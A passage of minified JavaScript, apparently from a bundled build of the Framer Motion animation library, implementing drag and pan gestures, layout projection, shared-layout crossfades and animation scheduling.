d=ln(window,"resize",()=>this.scalePositionWithinConstraints()),h=a.addEventListener("didUpdate",(({delta:p,hasLayoutChanged:f})=>{this.isDragging&&f&&(jt(m=>{const y=this.getAxisMotionValue(m);y&&(this.originPoint[m]+=p[m].translate,y.set(y.get()+p[m].translate))}),this.visualElement.render())}));return()=>{d(),r(),c(),h&&h()}}getProps(){const t=this.visualElement.getProps(),{drag:r=!1,dragDirectionLock:s=!1,dragPropagation:a=!1,dragConstraints:c=!1,dragElastic:d=Uc,dragMomentum:h=!0}=t;return{...t,drag:r,dragDirectionLock:s,dragPropagation:a,dragConstraints:c,dragElastic:d,dragMomentum:h}}}function Ro(i,t,r){return(t===!0||t===i)&&(r===null||r===i)}function Ax(i,t=10){let r=null;return Math.abs(i.y)>t?r="y":Math.abs(i.x)>t&&(r="x"),r}class Cx extends zn{constructor(t){super(t),this.removeGroupControls=Ue,this.removeListeners=Ue,this.controls=new Sx(t)}mount(){const{dragControls:t}=this.node.getProps();t&&(this.removeGroupControls=t.subscribe(this.controls)),this.removeListeners=this.controls.addListeners()||Ue}unmount(){this.removeGroupControls(),this.removeListeners()}}const xf=i=>(t,r)=>{i&&_e.update(()=>i(t,r))};class Ex extends zn{constructor(){super(...arguments),this.removePointerDownListener=Ue}onPointerDown(t){this.session=new Pm(t,this.createPanHandlers(),{transformPagePoint:this.node.getTransformPagePoint(),contextWindow:jm(this.node)})}createPanHandlers(){const{onPanSessionStart:t,onPanStart:r,onPan:s,onPanEnd:a}=this.node.getProps();return{onSessionStart:xf(t),onStart:xf(r),onMove:s,onEnd:(c,d)=>{delete this.session,a&&_e.update(()=>a(c,d))}}}mount(){this.removePointerDownListener=dn(this.node.current,"pointerdown",t=>this.onPointerDown(t))}update(){this.session&&this.session.updateHandlers(this.createPanHandlers())}unmount(){this.removePointerDownListener(),this.session&&this.session.end()}}function Px(){const i=S.useContext(ea);if(i===null)return[!0,null];const{isPresent:t,onExitComplete:r,register:s}=i,a=S.useId();return S.useEffect(()=>s(a),[]),!t&&r?[!1,()=>r&&r(a)]:[!0]}const Fo={hasAnimatedSinceResize:!0,hasEverUpdated:!1};function Tf(i,t){return t.max===t.min?0:i/(t.max-t.min)*100}const qr={correct:(i,t)=>{if(!t.target)return i;if(typeof i=="string")if(le.test(i))i=parseFloat(i);else return i;const r=Tf(i,t.target.x),s=Tf(i,t.target.y);return`${r}% ${s}%`}},Ix={correct:(i,{treeScale:t,projectionDelta:r})=>{const s=i,a=Fn.parse(i);if(a.length>5)return s;const c=Fn.createTransformer(i),d=typeof a[0]!="number"?1:0,h=r.x.scale*t.x,p=r.y.scale*t.y;a[0+d]/=h,a[1+d]/=p;const f=Be(h,p,.5);return typeof a[2+d]=="number"&&(a[2+d]/=f),typeof a[3+d]=="number"&&(a[3+d]/=f),c(a)}};class _x extends Ee.Component{componentDidMount(){const{visualElement:t,layoutGroup:r,switchLayoutGroup:s,layoutId:a}=this.props,{projection:c}=t;Bw(Rx),c&&(r.group&&r.group.add(c),s&&s.register&&a&&s.register(c),c.root.didUpdate(),c.addEventListener("animationComplete",()=>{this.safeToRemove()}),c.setOptions({...c.options,onExitComplete:()=>this.safeToRemove()})),Fo.hasEverUpdated=!0}getSnapshotBeforeUpdate(t){const{layoutDependency:r,visualElement:s,drag:a,isPresent:c}=this.props,d=s.projection;return d&&(d.isPresent=c,a||t.layoutDependency!==r||r===void 0?d.willUpdate():this.safeToRemove(),t.isPresent!==c&&(c?d.promote():d.relegate()||_e.postRender(()=>{const h=d.getStack();(!h||!h.members.length)&&this.safeToRemove()}))),null}componentDidUpdate(){const{projection:t}=this.props.visualElement;t&&(t.root.didUpdate(),queueMicrotask(()=>{!t.currentAnimation&&t.isLead()&&this.safeToRemove()}))}componentWillUnmount(){const{visualElement:t,layoutGroup:r,switchLayoutGroup:s}=this.props,{projection:a}=t;a&&(a.scheduleCheckAfterUnmount(),r&&r.group&&r.group.remove(a),s&&s.deregister&&s.deregister(a))}safeToRemove(){const{safeToRemove:t}=this.props;t&&t()}render(){return null}}function Om(i){const[t,r]=Px(),s=S.useContext(cd);return Ee.createElement(_x,{...i,layoutGroup:s,switchLayoutGroup:S.useContext(_g),isPresent:t,safeToRemove:r})}const Rx={borderRadius:{...qr,applyTo:["borderTopLeftRadius","borderTopRightRadius","borderBottomLeftRadius","borderBottomRightRadius"]},borderTopLeftRadius:qr,borderTopRightRadius:qr,borderBottomLeftRadius:qr,borderBottomRightRadius:qr,boxShadow:Ix},Lm=["TopLeft","TopRight","BottomLeft","BottomRight"],Dx=Lm.length,Sf=i=>typeof i=="string"?parseFloat(i):i,Af=i=>typeof i=="number"||le.test(i);function Mx(i,t,r,s,a,c){a?(i.opacity=Be(0,r.opacity!==void 0?r.opacity:1,jx(s)),i.opacityExit=Be(t.opacity!==void 0?t.opacity:1,0,Ox(s))):c&&(i.opacity=Be(t.opacity!==void 0?t.opacity:1,r.opacity!==void 0?r.opacity:1,s));for(let d=0;d<Dx;d++){const h=`border${Lm[d]}Radius`;let p=Cf(t,h),f=Cf(r,h);if(p===void 0&&f===void 0)continue;p||(p=0),f||(f=0),p===0||f===0||Af(p)===Af(f)?(i[h]=Math.max(Be(Sf(p),Sf(f),s),0),(Yt.test(f)||Yt.test(p))&&(i[h]+="%")):i[h]=f}(t.rotate||r.rotate)&&(i.rotate=Be(t.rotate||0,r.rotate||0,s))}function Cf(i,t){return i[t]!==void 0?i[t]:i.borderRadius}const jx=Bm(0,.5,sm),Ox=Bm(.5,.95,Ue);function Bm(i,t,r){return s=>s<i?0:s>t?1:r(ls(i,t,s))}function Ef(i,t){i.min=t.min,i.max=t.max}function Dt(i,t){Ef(i.x,t.x),Ef(i.y,t.y)}function Pf(i,t,r,s,a){return i-=t,i=Qo(i,1/r,s),a!==void 0&&(i=Qo(i,1/a,s)),i}function Lx(i,t=0,r=1,s=.5,a,c=i,d=i){if(Yt.test(t)&&(t=parseFloat(t),t=Be(d.min,d.max,t/100)-d.min),typeof t!="number")return;let h=Be(c.min,c.max,s);i===c&&(h-=t),i.min=Pf(i.min,t,r,h,a),i.max=Pf(i.max,t,r,h,a)}function If(i,t,[r,s,a],c,d){Lx(i,t[r],t[s],t[a],t.scale,c,d)}const Bx=["x","scaleX","originX"],Nx=["y","scaleY","originY"];function _f(i,t,r,s){If(i.x,t,Bx,r?r.x:void 0,s?s.x:void 0),If(i.y,t,Nx,r?r.y:void 0,s?s.y:void 0)}function Rf(i){return i.translate===0&&i.scale===1}function Nm(i){return Rf(i.x)&&Rf(i.y)}function Fx(i,t){return i.x.min===t.x.min&&i.x.max===t.x.max&&i.y.min===t.y.min&&i.y.max===t.y.max}function Fm(i,t){return Math.round(i.x.min)===Math.round(t.x.min)&&Math.round(i.x.max)===Math.round(t.x.max)&&Math.round(i.y.min)===Math.round(t.y.min)&&Math.round(i.y.max)===Math.round(t.y.max)}function Df(i){return St(i.x)/St(i.y)}class zx{constructor(){this.members=[]}add(t){Sd(this.members,t),t.scheduleRender()}remove(t){if(Ad(this.members,t),t===this.prevLead&&(this.prevLead=void 0),t===this.lead){const r=this.members[this.members.length-1];r&&this.promote(r)}}relegate(t){const r=this.members.findIndex(a=>t===a);if(r===0)return!1;let s;for(let a=r;a>=0;a--){const c=this.members[a];if(c.isPresent!==!1){s=c;break}}return s?(this.promote(s),!0):!1}promote(t,r){const s=this.lead;if(t!==s&&(this.prevLead=s,this.lead=t,t.show(),s)){s.instance&&s.scheduleRender(),t.scheduleRender(),t.resumeFrom=s,r&&(t.resumeFrom.preserveOpacity=!0),s.snapshot&&(t.snapshot=s.snapshot,t.snapshot.latestValues=s.animationValues||s.latestValues),t.root&&t.root.isUpdating&&(t.isLayoutDirty=!0);const{crossfade:a}=t.options;a===!1&&s.hide()}}exitAnimationComplete(){this.members.forEach(t=>{const{options:r,resumingFrom:s}=t;r.onExitComplete&&r.onExitComplete(),s&&s.options.onExitComplete&&s.options.onExitComplete()})}scheduleRender(){this.members.forEach(t=>{t.instance&&t.scheduleRender(!1)})}removeLeadSnapshot(){this.lead&&this.lead.snapshot&&(this.lead.snapshot=void 0)}}function Mf(i,t,r){let s="";const a=i.x.translate/t.x,c=i.y.translate/t.y;if((a||c)&&(s=`translate3d(${a}px, ${c}px, 0) `),(t.x!==1||t.y!==1)&&(s+=`scale(${1/t.x}, ${1/t.y}) `),r){const{rotate:p,rotateX:f,rotateY:m}=r;p&&(s+=`rotate(${p}deg) `),f&&(s+=`rotateX(${f}deg) `),m&&(s+=`rotateY(${m}deg) `)}const d=i.x.scale*t.x,h=i.y.scale*t.y;return(d!==1||h!==1)&&(s+=`scale(${d}, ${h})`),s||"none"}const Vx=(i,t)=>i.depth-t.depth;class Ux{constructor(){this.children=[],this.isDirty=!1}add(t){Sd(this.children,t),this.isDirty=!0}remove(t){Ad(this.children,t),this.isDirty=!0}forEach(t){this.isDirty&&this.children.sort(Vx),this.isDirty=!1,this.children.forEach(t)}}function Wx(i,t){const r=performance.now(),s=({timestamp:a})=>{const c=a-r;c>=t&&(hn(s),i(c-t))};return _e.read(s,!0),()=>hn(s)}function $x(i){window.MotionDebug&&window.MotionDebug.record(i)}function Hx(i){return i instanceof SVGElement&&i.tagName!=="svg"}function Gx(i,t,r){const s=mt(i)?i:tr(i);return s.start(Td("",s,t,r)),s.animation}const jf=["","X","Y","Z"],qx={visibility:"hidden"},Of=1e3;let Kx=0;const si={type:"projectionFrame",totalNodes:0,resolvedTargetDeltas:0,recalculatedProjection:0};function zm({attachResizeListener:i,defaultParent:t,measureScroll:r,checkIsScrollRoot:s,resetTransform:a}){return class{constructor(d={},h=t?.()){this.id=Kx++,this.animationId=0,this.children=new Set,this.options={},this.isTreeAnimating=!1,this.isAnimationBlocked=!1,this.isLayoutDirty=!1,this.isProjectionDirty=!1,this.isSharedProjectionDirty=!1,this.isTransformDirty=!1,this.updateManuallyBlocked=!1,this.updateBlockedByResize=!1,this.isUpdating=!1,this.isSVG=!1,this.needsReset=!1,this.shouldResetTransform=!1,this.treeScale={x:1,y:1},this.eventHandlers=new Map,this.hasTreeAnimated=!1,this.updateScheduled=!1,this.projectionUpdateScheduled=!1,this.checkUpdateFailed=()=>{this.isUpdating&&(this.isUpdating=!1,this.clearAllSnapshots())},this.updateProjection=()=>{this.projectionUpdateScheduled=!1,si.totalNodes=si.resolvedTargetDeltas=si.recalculatedProjection=0,this.nodes.forEach(Yx),this.nodes.forEach(n1),this.nodes.forEach(i1),this.nodes.forEach(Xx),$x(si)},this.hasProjected=!1,this.isVisible=!0,this.animationProgress=0,this.sharedNodes=new Map,this.latestValues=d,this.root=h?h.root||h:this,this.path=h?[...h.path,h]:[],this.parent=h,this.depth=h?h.depth+1:0;for(let p=0;p<this.path.length;p++)this.path[p].shouldResetTransform=!0;this.root===this&&(this.nodes=new Ux)}addEventListener(d,h){return this.eventHandlers.has(d)||this.eventHandlers.set(d,new Cd),this.eventHandlers.get(d).add(h)}notifyListeners(d,...h){const p=this.eventHandlers.get(d);p&&p.notify(...h)}hasListeners(d){return this.eventHandlers.has(d)}mount(d,h=this.root.hasTreeAnimated){if(this.instance)return;this.isSVG=Hx(d),this.instance=d;const{layoutId:p,layout:f,visualElement:m}=this.options;if(m&&!m.current&&m.mount(d),this.root.nodes.add(this),this.parent&&this.parent.children.add(this),h&&(f||p)&&(this.isLayoutDirty=!0),i){let y;const v=()=>this.root.updateBlockedByResize=!1;i(d,()=>{this.root.updateBlockedByResize=!0,y&&y(),y=Wx(v,250),Fo.hasAnimatedSinceResize&&(Fo.hasAnimatedSinceResize=!1,this.nodes.forEach(Bf))})}p&&this.root.registerSharedNode(p,this),this.options.animate!==!1&&m&&(p||f)&&this.addEventListener("didUpdate",({delta:y,hasLayoutChanged:v,hasRelativeTargetChanged:w,layout:P})=>{if(this.isTreeAnimationBlocked()){this.target=void 0,this.relativeTarget=void 0;return}const T=this.options.transition||m.getDefaultTransition()||l1,{onLayoutAnimationStart:C,onLayoutAnimationComplete:L}=m.getProps(),R=!this.targetLayout||!Fm(this.targetLayout,P)||w,M=!v&&w;if(this.options.layoutRoot||this.resumeFrom&&this.resumeFrom.instance||M||v&&(R||!this.currentAnimation)){this.resumeFrom&&(this.resumingFrom=this.resumeFrom,this.resumingFrom.resumingFrom=void 0),this.setAnimationOrigin(y,M);const O={...xd(T,"layout"),onPlay:C,onComplete:L};(m.shouldReduceMotion||this.options.layoutRoot)&&(O.delay=0,O.type=!1),this.startAnimation(O)}else v||Bf(this),this.isLead()&&this.options.onExitComplete&&this.options.onExitComplete();this.targetLayout=P})}unmount(){this.options.layoutId&&this.willUpdate(),this.root.nodes.remove(this);const d=this.getStack();d&&d.remove(this),this.parent&&this.parent.children.delete(this),this.instance=void 0,hn(this.updateProjection)}blockUpdate(){this.updateManuallyBlocked=!0}unblockUpdate(){this.updateManuallyBlocked=!1}isUpdateBlocked(){return this.updateManuallyBlocked||this.updateBlockedByResize}isTreeAnimationBlocked(){return this.isAnimationBlocked||this.parent&&this.parent.isTreeAnimationBlocked()||!1}startUpdate(){this.isUpdateBlocked()||(this.isUpdating=!0,this.nodes&&this.nodes.forEach(r1),this.animationId++)}getTransformTemplate(){const{visualElement:d}=this.options;return d&&d.getProps().transformTemplate}willUpdate(d=!0){if(this.root.hasTreeAnimated=!0,this.root.isUpdateBlocked()){this.options.onExitComplete&&this.options.onExitComplete();return}if(!this.root.isUpdating&&this.root.startUpdate(),this.isLayoutDirty)return;this.isLayoutDirty=!0;for(let m=0;m<this.path.length;m++){const y=this.path[m];y.shouldResetTransform=!0,y.updateScroll("snapshot"),y.options.layoutRoot&&y.willUpdate(!1)}const{layoutId:h,layout:p}=this.options;if(h===void 0&&!p)return;const f=this.getTransformTemplate();this.prevTransformTemplateValue=f?f(this.latestValues,""):void 0,this.updateSnapshot(),d&&this.notifyListeners("willUpdate")}update(){if(this.updateScheduled=!1,this.isUpdateBlocked()){this.unblockUpdate(),this.clearAllSnapshots(),this.nodes.forEach(Lf);return}this.isUpdating||this.nodes.forEach(e1),this.isUpdating=!1,this.nodes.forEach(t1),this.nodes.forEach(Jx),this.nodes.forEach(Qx),this.clearAllSnapshots();const h=performance.now();st.delta=Nn(0,1e3/60,h-st.timestamp),st.timestamp=h,st.isProcessing=!0,dc.update.process(st),dc.preRender.process(st),dc.render.process(st),st.isProcessing=!1}didUpdate(){this.updateScheduled||(this.updateScheduled=!0,queueMicrotask(()=>this.update()))}clearAllSnapshots(){this.nodes.forEach(Zx),this.sharedNodes.forEach(s1)}scheduleUpdateProjection(){this.projectionUpdateScheduled||(this.projectionUpdateScheduled=!0,_e.preRender(this.updateProjection,!1,!0))}scheduleCheckAfterUnmount(){_e.postRender(()=>{this.isLayoutDirty?this.root.didUpdate():this.root.checkUpdateFailed()})}updateSnapshot(){this.snapshot||!this.instance||(this.snapshot=this.measure())}updateLayout(){if(!this.instance||(this.updateScroll(),!(this.options.alwaysMeasureLayout&&this.isLead())&&!this.isLayoutDirty))return;if(this.resumeFrom&&!this.resumeFrom.instance)for(let p=0;p<this.path.length;p++)this.path[p].updateScroll();const d=this.layout;this.layout=this.measure(!1),this.layoutCorrected=$e(),this.isLayoutDirty=!1,this.projectionDelta=void 0,this.notifyListeners("measure",this.layout.layoutBox);const{visualElement:h}=this.options;h&&h.notify("LayoutMeasure",this.layout.layoutBox,d?d.layoutBox:void 0)}updateScroll(d="measure"){let h=!!(this.options.layoutScroll&&this.instance);this.scroll&&this.scroll.animationId===this.root.animationId&&this.scroll.phase===d&&(h=!1),h&&(this.scroll={animationId:this.root.animationId,phase:d,isRoot:s(this.instance),offset:r(this.instance)})}resetTransform(){if(!a)return;const d=this.isLayoutDirty||this.shouldResetTransform,h=this.projectionDelta&&!Nm(this.projectionDelta),p=this.getTransformTemplate(),f=p?p(this.latestValues,""):void 0,m=f!==this.prevTransformTemplateValue;d&&(h||ri(this.latestValues)||m)&&(a(this.instance,f),this.shouldResetTransform=!1,this.scheduleRender())}measure(d=!0){const h=this.measurePageBox();let p=this.removeElementScroll(h);return d&&(p=this.removeTransform(p)),c1(p),{animationId:this.root.animationId,measuredBox:h,layoutBox:p,latestValues:{},source:this.id}}measurePageBox(){const{visualElement:d}=this.options;if(!d)return $e();const h=d.measureViewportBox(),{scroll:p}=this.root;return p&&(jn(h.x,p.offset.x),jn(h.y,p.offset.y)),h}removeElementScroll(d){const h=$e();Dt(h,d);for(let p=0;p<this.path.length;p++){const f=this.path[p],{scroll:m,options:y}=f;if(f!==this.root&&m&&y.layoutScroll){if(m.isRoot){Dt(h,d);const{scroll:v}=this.root;v&&(jn(h.x,-v.offset.x),jn(h.y,-v.offset.y))}jn(h.x,m.offset.x),jn(h.y,m.offset.y)}}return h}applyTransform(d,h=!1){const p=$e();Dt(p,d);for(let f=0;f<this.path.length;f++){const m=this.path[f];!h&&m.options.layoutScroll&&m.scroll&&m!==m.root&&Zi(p,{x:-m.scroll.offset.x,y:-m.scroll.offset.y}),ri(m.latestValues)&&Zi(p,m.latestValues)}return ri(this.latestValues)&&Zi(p,this.latestValues),p}removeTransform(d){const h=$e();Dt(h,d);for(let p=0;p<this.path.length;p++){const f=this.path[p];if(!f.instance||!ri(f.latestValues))continue;Wc(f.latestValues)&&f.updateSnapshot();const m=$e(),y=f.measurePageBox();Dt(m,y),_f(h,f.latestValues,f.snapshot?f.snapshot.layoutBox:void 0,m)}return ri(this.latestValues)&&_f(h,this.latestValues),h}setTargetDelta(d){this.targetDelta=d,this.root.scheduleUpdateProjection(),this.isProjectionDirty=!0}setOptions(d){this.options={...this.options,...d,crossfade:d.crossfade!==void 0?d.crossfade:!0}}clearMeasurements(){this.scroll=void 0,this.layout=void 0,this.snapshot=void 0,this.prevTransformTemplateValue=void 0,this.targetDelta=void 0,this.target=void 0,this.isLayoutDirty=!1}forceRelativeParentToResolveTarget(){this.relativeParent&&this.relativeParent.resolvedRelativeTargetAt!==st.timestamp&&this.relativeParent.resolveTargetDelta(!0)}resolveTargetDelta(d=!1){var h;const p=this.getLead();this.isProjectionDirty||(this.isProjectionDirty=p.isProjectionDirty),this.isTransformDirty||(this.isTransformDirty=p.isTransformDirty),this.isSharedProjectionDirty||(this.isSharedProjectionDirty=p.isSharedProjectionDirty);const f=!!this.resumingFrom||this!==p;if(!(d||f&&this.isSharedProjectionDirty||this.isProjectionDirty||!((h=this.parent)===null||h===void 0)&&h.isProjectionDirty||this.attemptToResolveRelativeTarget))return;const{layout:y,layoutId:v}=this.options;if(!(!this.layout||!(y||v))){if(this.resolvedRelativeTargetAt=st.timestamp,!this.targetDelta&&!this.relativeTarget){const w=this.getClosestProjectingParent();w&&w.layout&&this.animationProgress!==1?(this.relativeParent=w,this.forceRelativeParentToResolveTarget(),this.relativeTarget=$e(),this.relativeTargetOrigin=$e(),ns(this.relativeTargetOrigin,this.layout.layoutBox,w.layout.layoutBox),Dt(this.relativeTarget,this.relativeTargetOrigin)):this.relativeParent=this.relativeTarget=void 0}if(!(!this.relativeTarget&&!this.targetDelta)){if(this.target||(this.target=$e(),this.targetWithTransforms=$e()),this.relativeTarget&&this.relativeTargetOrigin&&this.relativeParent&&this.relativeParent.target?(this.forceRelativeParentToResolveTarget(),dx(this.target,this.relativeTarget,this.relativeParent.target)):this.targetDelta?(this.resumingFrom?this.target=this.applyTransform(this.layout.layoutBox):Dt(this.target,this.layout.layoutBox),Dm(this.target,this.targetDelta)):Dt(this.target,this.layout.layoutBox),this.attemptToResolveRelativeTarget){this.attemptToResolveRelativeTarget=!1;const w=this.getClosestProjectingParent();w&&!!w.resumingFrom==!!this.resumingFrom&&!w.options.layoutScroll&&w.target&&this.animationProgress!==1?(this.relativeParent=w,this.forceRelativeParentToResolveTarget(),this.relativeTarget=$e(),this.relativeTargetOrigin=$e(),ns(this.relativeTargetOrigin,this.target,w.target),Dt(this.relativeTarget,this.relativeTargetOrigin)):this.relativeParent=this.relativeTarget=void 0}si.resolvedTargetDeltas++}}}getClosestProjectingParent(){if(!(!this.parent||Wc(this.parent.latestValues)||Rm(this.parent.latestValues)))return this.parent.isProjecting()?this.parent:this.parent.getClosestProjectingParent()}isProjecting(){return!!((this.relativeTarget||this.targetDelta||this.options.layoutRoot)&&this.layout)}calcProjection(){var d;const h=this.getLead(),p=!!this.resumingFrom||this!==h;let f=!0;if((this.isProjectionDirty||!((d=this.parent)===null||d===void 0)&&d.isProjectionDirty)&&(f=!1),p&&(this.isSharedProjectionDirty||this.isTransformDirty)&&(f=!1),this.resolvedRelativeTargetAt===st.timestamp&&(f=!1),f)return;const{layout:m,layoutId:y}=this.options;if(this.isTreeAnimating=!!(this.parent&&this.parent.isTreeAnimating||this.currentAnimation||this.pendingAnimation),this.isTreeAnimating||(this.targetDelta=this.relativeTarget=void 0),!this.layout||!(m||y))return;Dt(this.layoutCorrected,this.layout.layoutBox);const v=this.treeScale.x,w=this.treeScale.y;vx(this.layoutCorrected,this.treeScale,this.path,p),h.layout&&!h.target&&(this.treeScale.x!==1||this.treeScale.y!==1)&&(h.target=h.layout.layoutBox);const{target:P}=h;if(!P){this.projectionTransform&&(this.projectionDelta=Xi(),this.projectionTransform="none",this.scheduleRender());return}this.projectionDelta||(this.projectionDelta=Xi(),this.projectionDeltaWithTransform=Xi());const T=this.projectionTransform;ts(this.projectionDelta,this.layoutCorrected,P,this.latestValues),this.projectionTransform=Mf(this.projectionDelta,this.treeScale),(this.projectionTransform!==T||this.treeScale.x!==v||this.treeScale.y!==w)&&(this.hasProjected=!0,this.scheduleRender(),this.notifyListeners("projectionUpdate",P)),si.recalculatedProjection++}hide(){this.isVisible=!1}show(){this.isVisible=!0}scheduleRender(d=!0){if(this.options.scheduleRender&&this.options.scheduleRender(),d){const h=this.getStack();h&&h.scheduleRender()}this.resumingFrom&&!this.resumingFrom.instance&&(this.resumingFrom=void 0)}setAnimationOrigin(d,h=!1){const p=this.snapshot,f=p?p.latestValues:{},m={...this.latestValues},y=Xi();(!this.relativeParent||!this.relativeParent.options.layoutRoot)&&(this.relativeTarget=this.relativeTargetOrigin=void 0),this.attemptToResolveRelativeTarget=!h;const v=$e(),w=p?p.source:void 0,P=this.layout?this.layout.source:void 0,T=w!==P,C=this.getStack(),L=!C||C.members.length<=1,R=!!(T&&!L&&this.options.crossfade===!0&&!this.path.some(a1));this.animationProgress=0;let M;this.mixTargetDelta=O=>{const W=O/1e3;Nf(y.x,d.x,W),Nf(y.y,d.y,W),this.setTargetDelta(y),this.relativeTarget&&this.relativeTargetOrigin&&this.layout&&this.relativeParent&&this.relativeParent.layout&&(ns(v,this.layout.layoutBox,this.relativeParent.layout.layoutBox),o1(this.relativeTarget,this.relativeTargetOrigin,v,W),M&&Fx(this.relativeTarget,M)&&(this.isProjectionDirty=!1),M||(M=$e()),Dt(M,this.relativeTarget)),T&&(this.animationValues=m,Mx(m,f,this.latestValues,W,R,L)),this.root.scheduleUpdateProjection(),this.scheduleRender(),this.animationProgress=W},this.mixTargetDelta(this.options.layoutRoot?1e3:0)}startAnimation(d){this.notifyListeners("animationStart"),this.currentAnimation&&this.currentAnimation.stop(),this.resumingFrom&&this.resumingFrom.currentAnimation&&this.resumingFrom.currentAnimation.stop(),this.pendingAnimation&&(hn(this.pendingAnimation),this.pendingAnimation=void 0),this.pendingAnimation=_e.update(()=>{Fo.hasAnimatedSinceResize=!0,this.currentAnimation=Gx(0,Of,{...d,onUpdate:h=>{this.mixTargetDelta(h),d.onUpdate&&d.onUpdate(h)},onComplete:()=>{d.onComplete&&d.onComplete(),this.completeAnimation()}}),this.resumingFrom&&(this.resumingFrom.currentAnimation=this.currentAnimation),this.pendingAnimation=void 0})}completeAnimation(){this.resumingFrom&&(this.resumingFrom.currentAnimation=void 0,this.resumingFrom.preserveOpacity=void 0);const d=this.getStack();d&&d.exitAnimationComplete(),this.resumingFrom=this.currentAnimation=this.animationValues=void 0,this.notifyListeners("animationComplete")}finishAnimation(){this.currentAnimation&&(this.mixTargetDelta&&this.mixTargetDelta(Of),this.currentAnimation.stop()),this.completeAnimation()}applyTransformsToTarget(){const d=this.getLead();let{targetWithTransforms:h,target:p,layout:f,latestValues:m}=d;if(!(!h||!p||!f)){if(this!==d&&this.layout&&f&&Vm(this.options.animationType,this.layout.layoutBox,f.layoutBox)){p=this.target||$e();const y=St(this.layout.layoutBox.x);p.x.min=d.target.x.min,p.x.max=p.x.min+y;const v=St(this.layout.layoutBox.y);p.y.min=d.target.y.min,p.y.max=p.y.min+v}Dt(h,p),Zi(h,m),ts(this.projectionDeltaWithTransform,this.layoutCorrected,h,m)}}registerSharedNode(d,h){this.sharedNodes.has(d)||this.sharedNodes.set(d,new zx),this.sharedNodes.get(d).add(h);const f=h.options.initialPromotionConfig;h.promote({transition:f?f.transition:void 0,preserveFollowOpacity:f&&f.shouldPreserveFollowOpacity?f.shouldPreserveFollowOpacity(h):void 0})}isLead(){const d=this.getStack();return d?d.lead===this:!0}getLead(){var d;const{layoutId:h}=this.options;return h?((d=this.getStack())===null||d===void 0?void 0:d.lead)||this:this}getPrevLead(){var d;const{layoutId:h}=this.options;return h?(d=this.getStack())===null||d===void 0?void 0:d.prevLead:void 0}getStack(){const{layoutId:d}=this.options;if(d)return this.root.sharedNodes.get(d)}promote({needsReset:d,transition:h,preserveFollowOpacity:p}={}){const f=this.getStack();f&&f.promote(this,p),d&&(this.projectionDelta=void 0,this.needsReset=!0),h&&this.setOptions({transition:h})}relegate(){const d=this.getStack();return d?d.relegate(this):!1}resetRotation(){const{visualElement:d}=this.options;if(!d)return;let h=!1;const{latestValues:p}=d;if((p.rotate||p.rotateX||p.rotateY||p.rotateZ)&&(h=!0),!h)return;const f={};for(let m=0;m<jf.length;m++){const y="rotate"+jf[m];p[y]&&(f[y]=p[y],d.setStaticValue(y,0))}d.render();for(const m in f)d.setStaticValue(m,f[m]);d.scheduleRender()}getProjectionStyles(d){var h,p;if(!this.instance||this.isSVG)return;if(!this.isVisible)return qx;const f={visibility:""},m=this.getTransformTemplate();if(this.needsReset)return this.needsReset=!1,f.opacity="",f.pointerEvents=No(d?.pointerEvents)||"",f.transform=m?m(this.latestValues,""):"none",f;const y=this.getLead();if(!this.projectionDelta||!this.layout||!y.target){const T={};return this.options.layoutId&&(T.opacity=this.latestValues.opacity!==void 0?this.latestValues.opacity:1,T.pointerEvents=No(d?.pointerEvents)||""),this.hasProjected&&!ri(this.latestValues)&&(T.transform=m?m({},""):"none",this.hasProjected=!1),T}const v=y.animationValues||y.latestValues;this.applyTransformsToTarget(),f.transform=Mf(this.projectionDeltaWithTransform,this.treeScale,v),m&&(f.transform=m(v,f.transform));const{x:w,y:P}=this.projectionDelta;f.transformOrigin=`${w.origin*100}% ${P.origin*100}% 0`,y.animationValues?f.opacity=y===this?(p=(h=v.opacity)!==null&&h!==void 0?h:this.latestValues.opacity)!==null&&p!==void 0?p:1:this.preserveOpacity?this.latestValues.opacity:v.opacityExit:f.opacity=y===this?v.opacity!==void 0?v.opacity:"":v.opacityExit!==void 0?v.opacityExit:0;for(const T in Wo){if(v[T]===void 0)continue;const{correct:C,applyTo:L}=Wo[T],R=f.transform==="none"?v[T]:C(v[T],y);if(L){const M=L.length;for(let O=0;O<M;O++)f[L[O]]=R}else f[T]=R}return this.options.layoutId&&(f.pointerEvents=y===this?No(d?.pointerEvents)||"":"none"),f}clearSnapshot(){this.resumeFrom=this.snapshot=void 0}resetTree(){this.root.nodes.forEach(d=>{var h;return(h=d.currentAnimation)===null||h===void 0?void 0:h.stop()}),this.root.nodes.forEach(Lf),this.root.sharedNodes.clear()}}}function Jx(i){i.updateLayout()}function Qx(i){var t;const r=((t=i.resumeFrom)===null||t===void 0?void 0:t.snapshot)||i.snapshot;if(i.isLead()&&i.layout&&r&&i.hasListeners("didUpdate")){const{layoutBox:s,measuredBox:a}=i.layout,{animationType:c}=i.options,d=r.source!==i.layout.source;c==="size"?jt(y=>{const v=d?r.measuredBox[y]:r.layoutBox[y],w=St(v);v.min=s[y].min,v.max=v.min+w}):Vm(c,r.layoutBox,s)&&jt(y=>{const v=d?r.measuredBox[y]:r.layoutBox[y],w=St(s[y]);v.max=v.min+w,i.relativeTarget&&!i.currentAnimation&&(i.isProjectionDirty=!0,i.relativeTarget[y].max=i.relativeTarget[y].min+w)});const h=Xi();ts(h,s,r.layoutBox);const p=Xi();d?ts(p,i.applyTransform(a,!0),r.measuredBox):ts(p,s,r.layoutBox);const f=!Nm(h);let m=!1;if(!i.resumeFrom){const y=i.getClosestProjectingParent();if(y&&!y.resumeFrom){const{snapshot:v,layout:w}=y;if(v&&w){const P=$e();ns(P,r.layoutBox,v.layoutBox);const T=$e();ns(T,s,w.layoutBox),Fm(P,T)||(m=!0),y.options.layoutRoot&&(i.relativeTarget=T,i.relativeTargetOrigin=P,i.relativeParent=y)}}}i.notifyListeners("didUpdate",{layout:s,snapshot:r,delta:p,layoutDelta:h,hasLayoutChanged:f,hasRelativeTargetChanged:m})}else if(i.isLead()){const{onExitComplete:s}=i.options;s&&s()}i.options.transition=void 0}function Yx(i){si.totalNodes++,i.parent&&(i.isProjecting()||(i.isProjectionDirty=i.parent.isProjectionDirty),i.isSharedProjectionDirty||(i.isSharedProjectionDirty=!!(i.isProjectionDirty||i.parent.isProjectionDirty||i.parent.isSharedProjectionDirty)),i.isTransformDirty||(i.isTransformDirty=i.parent.isTransformDirty))}function Xx(i){i.isProjectionDirty=i.isSharedProjectionDirty=i.isTransformDirty=!1}function Zx(i){i.clearSnapshot()}function Lf(i){i.clearMeasurements()}function e1(i){i.isLayoutDirty=!1}function t1(i){const{visualElement:t}=i.options;t&&t.getProps().onBeforeLayoutMeasure&&t.notify("BeforeLayoutMeasure"),i.resetTransform()}function 